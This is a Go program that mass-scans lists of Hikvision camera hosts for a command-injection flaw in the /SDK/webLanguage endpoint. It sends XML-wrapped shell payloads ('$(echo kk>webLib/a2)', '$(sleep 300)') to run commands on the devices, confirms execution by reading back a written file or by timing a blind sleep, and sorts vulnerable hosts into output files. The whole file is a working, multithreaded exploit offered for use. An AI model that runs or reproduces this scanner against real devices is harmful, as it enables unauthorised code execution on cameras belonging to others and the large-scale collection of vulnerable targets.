package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

type ProgramArgs struct {
	infile      *string
	goodfile    *string
	badfile     *string
	errfile     *string
	unknownfile *string
	blindfile   *string
	timeout     *int
	delay       *int
	maxTries    *int
	threads     *int
	bufSize     *int
}

type HttpResponse struct {
	code int
	text string
}

type ColorPrint struct {
	info color.Color
	warn color.Color
	err  color.Color
	ok   color.Color
	good color.Color
	bad  color.Color
}

type Target struct {
	host     string
	port     int
	proto    string // http or https
	timeout  int    // request timeout
	delay    int    // delay before send second request
	try      int    // current try
	maxTries int    // max tries
}

type Result struct {
	host   string
	port   int
	result int8 // 0 - valid, 1 - invalid, 2 - err, 3 - unknown
	err    error
}

const (
	ResultValid      int8 = 0
	ResultInvalid    int8 = 1
	ResultErr        int8 = 2
	ResultUnknown    int8 = 3
	ResultBlindValid int8 = 4
)

var colfmt = ColorPrint{
	info: *color.New(color.BgBlack),
	warn: *color.New(color.BgYellow),
	err:  *color.New(color.BgRed),
	ok:   *color.New(color.BgGreen),
	good: *color.New(color.BgHiGreen),
	bad:  *color.New(color.BgHiRed),
}

var client1 *http.Client
var client2 *http.Client

func (target Target) send(url string, request_data interface{}) (HttpResponse, error) {
	time.Sleep(time.Duration(target.delay) * time.Millisecond)
	method := http.MethodPut
	data := ""
	full_url := fmt.Sprintf("%v://%v:%v%v", target.proto, target.host, target.port, url)

	switch v := request_data.(type) {
	case nil:
		data = ""
		method = http.MethodGet
	case []byte:
		data = fmt.Sprintf("<xml><language>$(%v)</language></xml>", string(v))
	case string:
		data = fmt.Sprintf("<xml><language>$(%v)</language></xml>", v)
	}

	req, err := http.NewRequest(method, full_url, bytes.NewBuffer([]byte(data)))
	if err != nil {
		colfmt.err.Println(err)
		return HttpResponse{}, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")

	resp, err := client1.Do(req)
	if err != nil {
		if target.proto == "http" && target.try == target.maxTries {
			target.proto = "https"
			target.try = 0
		} else if target.proto == "https" && target.try == target.maxTries {
			return HttpResponse{}, err
		}
		target.try++
		return target.send(url, request_data)
	}
	defer resp.Body.Close()

	bytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return HttpResponse{}, err
	}
	return HttpResponse{resp.StatusCode, string(bytes)}, nil
}

func (target *Target) checkBlind() *Result {
	time.Sleep(time.Duration(target.delay) * time.Millisecond)

	full_url := fmt.Sprintf("%v://%v:%v%v", target.proto, target.host, target.port, "/SDK/webLanguage")

	// no payload
	data := []byte("<xml><language>en</language></xml>")
	req, _ := http.NewRequest(http.MethodPut, full_url, bytes.NewBuffer(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")
	resp1, err := client1.Do(req)
	if err != nil {
		return &Result{target.host, target.port, ResultInvalid, nil} // invalid if no payload timeout
	}
	resp1.Body.Close()

	// with payload
	data = []byte("<xml><language>$(sleep 300)</language></xml>")
	req, _ = http.NewRequest(http.MethodPut, full_url, bytes.NewBuffer(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Host", fmt.Sprintf("%v:%v", target.host, target.port))
	req.Header.Set("Accept", "*/*")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9,sv;q=0.8")

	resp2, err := client2.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			return &Result{target.host, target.port, ResultBlindValid, nil} // valid if payload timeout
		}
		return &Result{target.host, target.port, ResultErr, err}
	}
	resp2.Body.Close()
	return &Result{target.host, target.port, ResultInvalid, nil} // invalid if payload no timeout
}

func (target *Target) checkTarget() *Result {
	resp, err := target.send("/SDK/webLanguage", "echo kk>webLib/a2")
	if err != nil {
		return &Result{target.host, target.port, ResultErr, err}
	}

	resp, err = target.send("/a2", nil)
	if err != nil || resp.code == 404 {
		return target.checkBlind()
	}

	if resp.code == 200 && resp.text == "kk\n" {
		return &Result{target.host, target.port, ResultValid, nil}
	} else if resp.code == 500 {
		return &Result{target.host, target.port, ResultUnknown, nil}
	} else {
		return &Result{target.host, target.port, ResultInvalid, nil}
	}
}

func printColoredErr(err *error) {
	fmt.Println(colfmt.err.Sprint(fmt.Sprintf("%T:", *err)), *err)
}

func parseProgramArgs() (ProgramArgs, error) {
	inputFile := flag.String("infile", "", "file with hikvision host:port format (required)")
	goodFile := flag.String("good", "", "save good hosts to file")
	badFile := flag.String("bad", "", "save bad hosts to file")
	errFile := flag.String("err", "", "save error hosts to file")
	unknownFile := flag.String("unknown", "", "save unknown hosts to file")
	blindFile := flag.String("blind", "", "save blind valid hosts to file")
	timeout := flag.Int("timeout", 5, "request timeout")
	delay := flag.Int("delay", 1000, "delay between requests in ms")
	maxTries := flag.Int("max_tries", 1, "max tries count to make request")
	threads := flag.Int("threads", 1, "threads count to making requests")
	bufSize := flag.Int("bufsize", 100, "size of chan buffer, don't change if you don't know what is it")
	flag.Parse()

	// check program required args
	if *inputFile == "" {
		return ProgramArgs{}, errors.New("-infile is required")
	}
	if *maxTries < 1 {
		return ProgramArgs{}, errors.New("-max_tries must be > 0")
	}
	if *threads < 1 {
		return ProgramArgs{}, errors.New("-threads must be > 0")
	}
	if *bufSize < 0 {
		return ProgramArgs{}, errors.New("-bufSize must be >= 0")
	}

	return ProgramArgs{inputFile, goodFile, badFile, errFile, unknownFile, blindFile, timeout, delay, maxTries, threads, bufSize}, nil
}

func bruteThread(targetChan chan *Target, resultChan chan *Result, finishedThreadsChan chan int, wg *sync.WaitGroup, threadNumber int) {
	fmt.Println(colfmt.info.Sprint("INFO"), "thread", threadNumber, "started")
	var target *Target
	var result *Result
	var more bool
	for {
		select {
		case target, more = <-targetChan: // get target from chan
			if more {
				result = target.checkTarget()
				resultChan <- result
				target = nil
				result = nil
			} else {
				fmt.Println(colfmt.info.Sprint("INFO"), "Thread", threadNumber, "finished")
				wg.Done()
				// if all threads finished
				finishedThreadsChan <- threadNumber
				return
			}
		}
	}
}

func fillTargetChan(args ProgramArgs, targetChan chan *Target, wg *sync.WaitGroup) {
	fmt.Println(colfmt.info.Sprint("INFO"), "fillTargetChan Thread started")
	file, err := os.Open(*args.infile)
	if err != nil {
		printColoredErr(&err)
		os.Exit(1)
	}
	defer file.Close()

	reader := bufio.NewReaderSize(file, 1)
	var line, host string
	var splitedLine []string
	var port int
	var target *Target

	for {
		line, err = reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			} else {
				colfmt.err.Println("err while reading file:", err)
				return
			}
		}
		splitedLine = strings.Split(line, ":")

		// if splited line not enough port or host
		if len(splitedLine) != 2 {
			colfmt.warn.Println("Cannot parse line ->", line)
			continue
		}
		host = splitedLine[0]
		port, err = strconv.Atoi(strings.Trim(splitedLine[1], " \t\n"))

		// if port is invalid
		if err != nil {
			colfmt.warn.Println("Cannot parse port to host ->", host)
			continue
		}
		target = &Target{host, port, "http", *args.timeout, *args.delay, 1, *args.maxTries}
		targetChan <- target
		target = nil
	}
	fmt.Println(colfmt.info.Sprint("INFO"), "fillTargetChan Thread finished")
	close(targetChan)
	wg.Done()
}

func addStringToFile(filepath *string, data string) {
	myfile, err := os.OpenFile(*filepath, os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
		colfmt.err.Println("FILE IS BUSY")
	}
	fmt.Fprint(myfile, data)
	myfile.Close()
}

func createFileIfNotExists(filepath *string) {
	myfile, _ := os.Create(*filepath)
	myfile.Close()
}

func writeResultToFiles(resultChan chan *Result, finishedThreadsChan chan int, wg *sync.WaitGroup, programArgs ProgramArgs) { // fix it
	fmt.Println(colfmt.info.Sprint("INFO"), "writeResultToFiles Thread started")
	var isGoodFileUse, isBadFileUse, isErrFileUse, isUnknownFileUse, isBlindFileUse bool
	// creating files if not exists
	if *programArgs.goodfile != "" {
		createFileIfNotExists(programArgs.goodfile)
		isGoodFileUse = true
	}
	if *programArgs.blindfile != "" {
		createFileIfNotExists(programArgs.blindfile)
		isBlindFileUse = true
	}
	if *programArgs.badfile != "" {
		createFileIfNotExists(programArgs.badfile)
		isBadFileUse = true
	}
	if *programArgs.errfile != "" {
		createFileIfNotExists(programArgs.errfile)
		isErrFileUse = true
	}
	if *programArgs.unknownfile != "" {
		createFileIfNotExists(programArgs.unknownfile)
		isUnknownFileUse = true
	}

	finishedThreadsCount := 0

	// printedResults := 0

	for {
		select {
		case result := <-resultChan:
			// printedResults++
			switch result.result {
			case ResultValid:
				colfmt.good.Printf("%v %v:%v\n", "GOOD", result.host, result.port)
				if isGoodFileUse {
					addStringToFile(programArgs.goodfile, fmt.Sprintf("%v:%v\n", result.host, result.port))
				}
			case ResultInvalid:
				fmt.Printf("%v %v:%v\n", colfmt.bad.Sprint(" BAD"), result.host, result.port)
				if isBadFileUse {
					addStringToFile(programArgs.badfile, fmt.Sprintf("%v:%v\n", result.host, result.port))
				}
			case ResultErr:
				fmt.Printf("%v %v:%v %v\n", colfmt.err.Sprint("*ERR"), result.host, result.port, colfmt.err.Sprint(result.err))
				if isErrFileUse {
					addStringToFile(programArgs.errfile, fmt.Sprintf("%v:%v\n", result.host, result.port))
				}
			case ResultUnknown:
				fmt.Printf("%v %v:%v\n", colfmt.info.Sprint("UKWN"), result.host, result.port)
				if isUnknownFileUse {
					addStringToFile(programArgs.unknownfile, fmt.Sprintf("%v:%v\n", result.host, result.port))
				}
			case ResultBlindValid:
				colfmt.good.Printf("%v %v:%v\n", "BLND", result.host, result.port)
				if isBlindFileUse {
					addStringToFile(programArgs.blindfile, fmt.Sprintf("%v:%v\n", result.host, result.port))
				}
			}
			result = nil

			// if time to save results
			// if printedResults == *programArgs.bufSize {
			// 	// runtime.GC()
			// 	debug.FreeOSMemory()
			// 	printedResults = 0
			// }
		case <-finishedThreadsChan:
			finishedThreadsCount++
			// 	// if all threads finished
			if finishedThreadsCount == *programArgs.threads {
				fmt.Println(colfmt.info.Sprint("INFO"), "writeResultToFiles Thread finished")
				wg.Done()
				return
			}
		}
	}
}

func main() {
	programArgs, err := parseProgramArgs()
	if err != nil {
		printColoredErr(&err)
		os.Exit(1)
	}

	fmt.Print("Input file: ", colfmt.ok.Sprint(*programArgs.infile),
		"\nGood file: ", colfmt.ok.Sprint(*programArgs.goodfile),
		"\nBad file: ", colfmt.ok.Sprint(*programArgs.badfile),
		"\nErr file: ", colfmt.ok.Sprint(*programArgs.errfile),
		"\nUnknown file: ", colfmt.ok.Sprint(*programArgs.unknownfile),
		"\nTimeout: ", colfmt.ok.Sprint(*programArgs.timeout, "s"),
		"\nDelay: ", colfmt.ok.Sprint(*programArgs.delay, "ms"),
		"\nMax tries: ", colfmt.ok.Sprint(*programArgs.maxTries),
		"\nThreads: ", colfmt.ok.Sprint(*programArgs.threads), "\n\n",
	)

	client1 = &http.Client{
		Timeout: time.Duration(*programArgs.timeout) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					return nil
				},
			},
		},
	}

	client2 = &http.Client{
		Timeout: time.Duration(*programArgs.timeout+10) * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
					return nil
				},
			},
		},
	}

	wg := sync.WaitGroup{}
	// calculating threads count
	wg.Add(2 + *programArgs.threads)
	// allocating chan size for threads count
	targetChan := make(chan *Target, *programArgs.bufSize)
	resultChan := make(chan *Result, *programArgs.bufSize)
	finishedThreadsChan := make(chan int, 1)

	// add all targets to chan
	go fillTargetChan(programArgs, targetChan, &wg)
	go writeResultToFiles(resultChan, finishedThreadsChan, &wg, programArgs)
	// starting threads
	for i := 0; i < *programArgs.threads; i++ {
		go bruteThread(targetChan, resultChan, finishedThreadsChan, &wg, i+1)
	}
	wg.Wait()
}
